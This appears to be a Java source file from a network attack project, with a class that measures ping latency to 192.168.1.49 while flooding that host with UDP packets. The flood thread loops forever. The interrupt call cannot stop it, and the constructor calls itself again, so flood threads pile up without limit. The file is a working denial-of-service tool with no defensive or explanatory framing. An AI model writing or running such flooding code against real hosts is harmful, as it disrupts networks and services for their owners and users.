package attack.sniffer;

import attack.WiresharkFlood;
import utils.LoggingUtils;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class PingDrop extends LoggingUtils {

    public PingDrop() throws IOException, InterruptedException {

        final long startTime = System.nanoTime() / 1000;
        try {
            InetAddress.getByName("192.168.1.49").isReachable(10000);
        } catch (final IOException e) {
        }

        final long resultTime = System.nanoTime() / 1000 - startTime;

        final Thread t = new Thread(() -> {
            try {
                byte[] b = new byte[1];
                new Random().nextBytes(b);
                final DatagramSocket socket = new DatagramSocket();
                final DatagramPacket packet
                        = new DatagramPacket(b, b.length, InetAddress.getByName("192.168.1.49"), 1);
                while (true) {
                    socket.send(packet);
                }
            } catch (final IOException ignored) {}
        });

        t.start();

        final long start2 = System.nanoTime() / 1000;
        try {
            InetAddress.getByName("192.168.1.49").isReachable(10000);
        } catch (final IOException e) {
        }

        final long resultTime2 = System.nanoTime() / 1000 - start2;

        System.out.println("Diff " + (resultTime2 - resultTime));

        t.interrupt();

        Thread.sleep(5000);

        new PingDrop();
    }
}
